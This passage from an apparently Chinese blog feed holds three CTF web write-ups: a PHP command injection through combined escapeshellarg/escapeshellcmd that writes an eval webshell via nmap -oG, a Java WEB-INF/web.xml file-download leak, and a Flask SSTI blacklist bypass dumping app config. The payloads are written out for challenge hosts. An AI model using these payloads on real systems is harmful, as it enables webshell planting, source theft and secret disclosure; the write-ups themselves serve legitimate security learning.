        <content type="html"><![CDATA[<h1 id="BUUCTF-2018-Online-Too-1题解"><a href="#BUUCTF-2018-Online-Too-1题解" class="headerlink" title="BUUCTF 2018 Online Too 1题解"></a>BUUCTF 2018 Online Too 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="escapeshellarg和escapeshellcmd合用的漏洞"><a href="#escapeshellarg和escapeshellcmd合用的漏洞" class="headerlink" title="escapeshellarg和escapeshellcmd合用的漏洞"></a>escapeshellarg和escapeshellcmd合用的漏洞</h3><p>escapeshellarg-把字符串转码为可以在 shell 命令里使用的参数<br>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含<br>escapeshellcmd — shell 元字符转义<br>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。<br>反斜线（\）会在以下字符之前插入： &amp;#;`| * ? ~ &lt; &gt; ^ ( ) [ ] { } $ \, \x0A 和 \xFF。' 和" 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。<br>但是两个一起使用就会出现一些bug<br>比如:</p><pre class=" language-1"><code class="language-1">输入：127.0.0.1'escapeshellarg后：'127.0.0.1'\'''escapeshellcmd后：'127.0.0.1'\\''\'</code></pre><p>而这时，\转义的是\，即此时出现了一个配对的单引号。可以将上面的语句转述为</p><pre class=" language-1"><code class="language-1">127.0.0.1\</code></pre><h3 id="nmap常用命令"><a href="#nmap常用命令" class="headerlink" title="nmap常用命令"></a>nmap常用命令</h3><p>参考<a href="https://www.jianshu.com/p/4c696b1a95b1">nmap常用命令总结</a></p><pre class=" language-1"><code class="language-1">nmap -v 详细信息输出nmap -p 指定端口nmap -iL 扫描文件中的ipnmap -exclude 不扫描某些ipnmap -Pn 使用ping扫描，显式地关闭端口扫描，用于主机发现nmap -sn 使用ping扫描，进行端口扫描，假设主机都是up的nmap -sS 使用SYN扫描，不需要完成三次握手nmap -sT TCP connect扫描，需要完成三次握手，只适用于找出TCP和UDP端口nmap -sU 扫描UDP端口nmap -sF FIN扫描，用于探测防火墙状态，识别端口是否关闭，容易漏扫nmap -sV 扫描目标主机的端口和软件版本nmap -O 远程检测操作系统和软件nmap -O --osscan-guess 猜测目标操作系统版本nmap -traceroute 路由跟踪nmap -A 综合扫描，包含1-10000的端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测nmap -oN result.txt 将标准输出写入到指定文件中nmap -oX result.xml 将输入写成xml的形式nmap -oS result.txt 将输出写成特殊符号的形式，内容跟-oN是一样的，只是字体变了而已nmap -oG result.txt 将输出写成特殊格式nmap -oA 将输出所有格式，有三种 .xml/ .gnmap/ .nmapnmap -T[0-5] 时间参数模板   -T0 用于躲避IDS，时间很长  -T1 用于躲避IDS，时间很长  -T2 降低了扫描速度，使用更小的带宽和目标主机资源对目标靶机进行扫描  -T3 默认模式，未做优化  -T4 假设用户具有合适及可靠的网络而加速对目标靶机的扫描  -T5 假设用户具有更好的网络或者愿意牺牲准确性而加速扫描nmap -sC 根据端口识别服务自动调用默认脚本nmap --script</code></pre><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>打开题目发现</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">"glzjin"</span><span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'you are in sandbox '</span><span class="token punctuation">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>HTTP_X_FORWARDED_FOR<br>是我们很熟悉的X_Forwarded_For，查询本地IP，remote_addr表示发出请求的远程主机的IP地址，具体可参考<a href="https://www.cnblogs.com/luxiaojun/p/10451860.html">HTTP 请求头中的 Remote_Addr，X-Forwarded-For，X-Real-IP</a>，这里大体是不需要用的。<br>最后有一个system命令执行</p><pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我们可以利用nmap -oG写一个webshell。<br>最后可以构造payload</p><pre class=" language-1"><code class="language-1">?host=' <?php @eval($_POST["kb"]);?> -oG hack.php '</code></pre><p>payload的解释：<br>1.两边同时加单引号是为了绕过escapeshellarg()函数最初在字符串两边加的’。<br>2.两边加空格是因为，对于</p><pre class=" language-1"><code class="language-1">'a'escapeshellarg() -> '\''a'\'''secapeshellcmd() -> ''\\''a'\\'''' a 'escapeshellarg() -> ''\'' a '\'''escapeshellcmd() -> ''\\'' a '\\'''</code></pre><p>最终会导致文件名变为hack.php\<br>3.为什么kb要用双引号而不是单引号，参考上文a的例子，会导致最后变为\a\，无法成功。</p><p>回显中有文件名称dd36be70fa6fc1db7e62344640c0a415<br>蚁剑链接：<a href="http://21f51ae1-bdcf-46a0-83cb-72ddc9b2469b.node4.buuoj.cn:81/dd36be70fa6fc1db7e62344640c0a415/hack.php">http://21f51ae1-bdcf-46a0-83cb-72ddc9b2469b.node4.buuoj.cn:81/dd36be70fa6fc1db7e62344640c0a415/hack.php</a><br>得到flag:flag{0cc01a96-e6f3-4c99-a0d8-d5ea857d4c7d}</p><p>参考：<br><a href="https://blog.csdn.net/qq_26406447/article/details/100711933">https://blog.csdn.net/qq_26406447/article/details/100711933</a><br><a href="https://blog.csdn.net/weixin_44348894/article/details/105520481">https://blog.csdn.net/weixin_44348894/article/details/105520481</a><br><a href="https://www.cnblogs.com/WHOAMI-xiaoyu/p/15482106.html">https://www.cnblogs.com/WHOAMI-xiaoyu/p/15482106.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF 2019 Easy Java 1题解</title>
      <link href="/2022/02/11/RoarCTF%202019%20Easy%20Java%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/11/RoarCTF%202019%20Easy%20Java%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Java-1题解"><a href="#RoarCTF-2019-Easy-Java-1题解" class="headerlink" title="RoarCTF 2019 Easy Java 1题解"></a>RoarCTF 2019 Easy Java 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="java服务器下的web-inf"><a href="#java服务器下的web-inf" class="headerlink" title="java服务器下的web-inf"></a>java服务器下的web-inf</h3><p>我们可以直接下载WEB-INF/web.xml配置文件，WEB-INF文件夹下的文件是不能被直接访问到的，通常是用来存储重要的配置文件等。<br>WEB-INF主要包含以下文件或目录:</p><pre class=" language-1"><code class="language-1">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><p>可以参考<a href="https://blog.csdn.net/wy_97/article/details/78165051">ctf/web源码泄露及利用办法</a>的博客</p><h4 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h4><p>漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF /* { deny all; } 或者return 404; 或者其他！</p><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>底下有一个help，点进去得到</p><pre class=" language-java"><code class="language-java">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>FileNotFoundException<span class="token operator">:</span><span class="token punctuation">{</span>help<span class="token punctuation">.</span>docx<span class="token punctuation">}</span></code></pre><p>页面的url是这样的：<a href="http://86895b7a-be34-4fd3-95b9-43ad6e382d76.node4.buuoj.cn:81/Download?filename=help.docx">http://86895b7a-be34-4fd3-95b9-43ad6e382d76.node4.buuoj.cn:81/Download?filename=help.docx</a><br>应该是任意文件下载，抓包发现</p><pre class=" language-HTTP"><code class="language-HTTP">GET /Download?filename=help.docx HTTP/1.1Host: 86895b7a-be34-4fd3-95b9-43ad6e382d76.node4.buuoj.cn:81User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: UM_distinctid=17c1cc449b65c5-063754ec1fcf098-4c3e2778-fa000-17c1cc449b83ee; JSESSIONID=C2B1F6CDFEC25D8C5E502567881DDF3DUpgrade-Insecure-Requests: 1</code></pre><p>尝试POST方式请求。成功下载help.docx，打开是</p><pre class=" language-1"><code class="language-1">Are you sure the flag is here? ? ?</code></pre><p>根据提示有Java服务器，直接下载WEB-INF/web.xml文件。<br>抓包修改</p><pre class=" language-HTTP"><code class="language-HTTP">POST /Download?filename=WEB-INF/web.xml HTTP/1.1Host: 86895b7a-be34-4fd3-95b9-43ad6e382d76.node4.buuoj.cn:81User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: UM_distinctid=17c1cc449b65c5-063754ec1fcf098-4c3e2778-fa000-17c1cc449b83ee; JSESSIONID=C2B1F6CDFEC25D8C5E502567881DDF3DUpgrade-Insecure-Requests: 1</code></pre><p>得到</p><pre class=" language-html"><code class="language-html"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd<span class="token punctuation">"</span></span>         <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file-list</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>IndexController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.wm.ctf.IndexController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>IndexController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/Index<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>LoginController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.wm.ctf.LoginController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>LoginController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/Login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>DownloadController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.wm.ctf.DownloadController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>DownloadController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/Download<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>FlagController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.wm.ctf.FlagController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>FlagController<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/Flag<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span></code></pre><p>找到了com.wm.ctf.FlagController，最后构造payload：filename=WEB-INF/classes/com/wm/ctf/FlagController.class下载得到，找到ZmxhZ3s4OTBmNDQ1NS1lNDhhLTQzMjUtOTNjZC0wMDg4MTk2MWNiMDZ9Cg==<br>base64解码得到flag:flag{890f4455-e48a-4325-93cd-00881961cb06}</p><p>参考：<br><a href="https://www.cnblogs.com/WHOAMI-xiaoyu/p/15485304.html">https://www.cnblogs.com/WHOAMI-xiaoyu/p/15485304.html</a><br><a href="https://www.cnblogs.com/gtx690/p/13257713.html">https://www.cnblogs.com/gtx690/p/13257713.html</a><br><a href="https://blog.csdn.net/SopRomeo/article/details/104201079">https://blog.csdn.net/SopRomeo/article/details/104201079</a><br><a href="https://blog.csdn.net/ChenZIDu/article/details/103533554">https://blog.csdn.net/ChenZIDu/article/details/103533554</a><br><a href="https://blog.csdn.net/wy_97/article/details/78165051">https://blog.csdn.net/wy_97/article/details/78165051</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB-INF/web.xml泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web高手进阶区shrine题解</title>
      <link href="/2022/02/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BAshrine%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/02/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6%E5%8C%BAshrine%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界web高手进阶区shrine题解"><a href="#攻防世界web高手进阶区shrine题解" class="headerlink" title="攻防世界web高手进阶区shrine题解"></a>攻防世界web高手进阶区shrine题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="flask模板注入"><a href="#flask模板注入" class="headerlink" title="flask模板注入"></a>flask模板注入</h3><p><a href="https://kingofkb.github.io/2022/01/17/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%ABweb-flask%E5%A4%8D%E7%8E%B0/">长安战疫web-flask复现</a><br>这个题目是一种新的姿势</p><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>打开题目，发现代码，ctrl+u代码审计</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> flask<span class="token keyword">import</span> osapp <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine>'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'{{% set {}=None%}}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p>首先有一句</p><pre class=" language-python"><code class="language-python">app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span></code></pre><p>告诉我们FLAG应该在config中，然后</p><pre class=" language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine>'</span><span class="token punctuation">)</span></code></pre><p>告诉了我们一个路径，尝试/shrine/123，回显：123<br>发现我们无论输入什么都会回显，尝试/shrine/{ { 2*3 } }，回显：6<br>发现注点。<br>最后是一句过滤</p><pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span></code></pre><p>发现ban了()和config以及self，<br>没有黑名单的时候，我们可以传入 config，或者传入{ { self._dict_ } }获取<br>那么我们原来格式的模板注入就不能用了，这个时候我们想到了内置函数url_for和get_flashed_messages<br>于是可以构造payload</p><pre class=" language-1"><code class="language-1">/shrine/{{url_for.__globals__}}/shrine/{{get_flashed_messages.__globals__}}</code></pre><p>回显中有current_app，于是我们可以调用current_app中的config文件，最后构造payload</p><pre class=" language-1"><code class="language-1">/shrine/{{url_for.__globals__['current_app'].config}}/shrine/{{get_flashed_messages.__globals__['current_app'].config}}</code></pre><p>回显：</p><pre class=" language-1"><code class="language-1"><Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_NAME': 'session', 'MAX_COOKIE_SIZE': 4093, 'SESSION_COOKIE_SAMESITE': None, 'PROPAGATE_EXCEPTIONS': None, 'ENV': 'production', 'DEBUG': False, 'SECRET_KEY': None, 'EXPLAIN_TEMPLATE_LOADING': False, 'MAX_CONTENT_LENGTH': None, 'APPLICATION_ROOT': '/', 'SERVER_NAME': None, 'FLAG': 'flag{shrine_is_good_ssti}', 'PREFERRED_URL_SCHEME': 'http', 'JSONIFY_PRETTYPRINT_REGULAR': False, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'TEMPLATES_AUTO_RELOAD': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'JSON_SORT_KEYS': True, 'JSONIFY_MIMETYPE': 'application/json', 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'TRAP_HTTP_EXCEPTIONS': False}></code></pre><p>其中找到了FLAG，得到flag:flag{shrine_is_good_ssti}</p><p>参考：<br><a href="https://www.cnblogs.com/wuhongbin/p/14283829.html">https://www.cnblogs.com/wuhongbin/p/14283829.html</a><br><a href="https://www.freesion.com/article/36611011455/">https://www.freesion.com/article/36611011455/</a><br><a href="https://blog.csdn.net/xj28555/article/details/107354079/">https://blog.csdn.net/xj28555/article/details/107354079/</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2018 Fakebook 1题解</title>
